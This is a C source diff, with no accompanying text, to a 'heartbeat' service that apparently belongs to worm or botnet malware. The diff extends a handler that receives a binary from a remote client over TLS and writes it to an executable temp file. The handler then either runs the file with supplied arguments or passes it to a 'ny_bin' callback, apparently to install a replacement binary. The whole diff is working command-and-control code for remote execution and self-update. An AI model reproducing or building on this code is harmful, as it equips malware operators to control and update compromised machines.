@@ -895,7 +895,7 @@ END:
 	prne_htbt_free_cmd(&cmd);
 }
 
-static void htbt_lbd_srv_run_bin (
+static void htbt_lbd_srv_bin (
 	htbt_lbd_client_t *ctx,
 	pth_event_t root_ev,
 	size_t off,
@@ -904,13 +904,17 @@ static void htbt_lbd_srv_run_bin (
 	prne_htbt_bin_meta_t bin_meta;
 	size_t actual;
 	prne_htbt_ser_rc_t s_ret;
-	char *add_args[1] = { NULL };
+	char *path = NULL;
 	char **args = NULL;
 	int fd = -1, f_ret;
 	struct pollfd pfd;
 	pth_event_t ev = NULL;
 	prne_htbt_status_code_t ret_status = PRNE_HTBT_STATUS_OK;
 	int32_t ret_errno = 0;
+
+	prne_dbgast(
+		mh->op == PRNE_HTBT_OP_RUN_BIN ||
+		mh->op == PRNE_HTBT_OP_NY_BIN);
 
 	prne_htbt_init_bin_meta(&bin_meta);
 
@@ -936,25 +940,23 @@ static void htbt_lbd_srv_run_bin (
 		ret_status = PRNE_HTBT_STATUS_UNIMPL;
 		goto SND_STATUS;
 	}
+	if (mh->op == PRNE_HTBT_OP_NY_BIN &&
+		ctx->parent->param.cb_f.ny_bin == NULL)
+	{
+		ret_status = PRNE_HTBT_STATUS_UNIMPL;
+		goto SND_STATUS;
+	}
+
+
 	errno = 0;
-	add_args[0] = ctx->parent->param.cb_f.tmpfile(bin_meta.bin_size, 0700);
-	if (add_args[0] == NULL) {
+	path = ctx->parent->param.cb_f.tmpfile(bin_meta.bin_size, 0700);
+	if (path == NULL) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_errno = errno;
 		goto SND_STATUS;
 	}
-	args = prne_htbt_parse_args(
-		bin_meta.cmd.mem,
-		bin_meta.cmd.mem_len,
-		1,
-		add_args,
-		NULL,
-		SIZE_MAX);
-	if (args == NULL) {
-		goto END;
-	}
 
-	fd = open(add_args[0], O_WRONLY);
+	fd = open(path, O_WRONLY);
 	if (fd < 0) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_errno = errno;
@@ -987,7 +989,7 @@ static void htbt_lbd_srv_run_bin (
 					ctx->iobuf[0].m,
 					ctx->iobuf[0].avail);
 				if (f_ret <= 0) {
-					goto END;
+					goto PROTO_ERR;
 				}
 				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
 			}
@@ -997,7 +999,8 @@ static void htbt_lbd_srv_run_bin (
 		}
 
 		actual = prne_op_min(bin_meta.bin_size, ctx->iobuf[0].len);
-		f_ret = pth_write(fd, ctx->iobuf[0].m, actual);
+		// This blocks!
+		f_ret = write(fd, ctx->iobuf[0].m, actual);
 		prne_iobuf_shift(ctx->iobuf + 0, -actual);
 		bin_meta.bin_size -= actual;
 		if (f_ret < 0) {
@@ -1009,15 +1012,39 @@ static void htbt_lbd_srv_run_bin (
 	close(fd);
 	fd = -1;
 
-	htbt_do_cmd(
-		bin_meta.cmd.detach,
-		args,
-		ctx->fd,
-		&ctx->ssl,
-		ctx->iobuf,
-		mh->id,
-		&ret_status,
-		&ret_errno);
+	if (mh->op == PRNE_HTBT_OP_RUN_BIN) {
+		char *add_args[1] = { path };
+
+		args = prne_htbt_parse_args(
+			bin_meta.cmd.mem,
+			bin_meta.cmd.mem_len,
+			1,
+			add_args,
+			NULL,
+			SIZE_MAX);
+		if (args == NULL) {
+			goto END;
+		}
+
+		htbt_do_cmd(
+			bin_meta.cmd.detach,
+			args,
+			ctx->fd,
+			&ctx->ssl,
+			ctx->iobuf,
+			mh->id,
+			&ret_status,
+			&ret_errno);
+	}
+	else {
+		if (!ctx->parent->param.cb_f.ny_bin(path, &bin_meta.cmd)) {
+			ret_status = PRNE_HTBT_STATUS_ERRNO;
+			ret_errno = errno;
+			goto SND_STATUS;
+		}
+		path[0] = 0;
+	}
+
 	goto SND_STATUS;
 PROTO_ERR:
 	htbt_lbd_raise_protoerr(ctx, mh->id, 0);
@@ -1033,10 +1060,10 @@ SND_STATUS:
 END:
 	ctx->skip = bin_meta.bin_size;
 	prne_htbt_free_bin_meta(&bin_meta);
-	if (add_args[0] != NULL) {
-		unlink(add_args[0]);
-		prne_free(add_args[0]);
+	if (path[0] != 0) {
+		unlink(path);
 	}
+	prne_free(path);
 	prne_free(args);
 	prne_close(fd);
 	pth_event_free(ev, FALSE);
@@ -1105,10 +1132,10 @@ static bool htbt_lbd_consume_inbuf (
 			htbt_lbd_srv_run_cmd(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_RUN_BIN:
-			htbt_lbd_srv_run_bin(ctx, root_ev, actual, &f_head);
+		case PRNE_HTBT_OP_NY_BIN:
+			htbt_lbd_srv_bin(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_HOVER:
-		case PRNE_HTBT_OP_NY_BIN:
 		default:
 			htbt_lbd_raise_protoerr(
 				ctx,
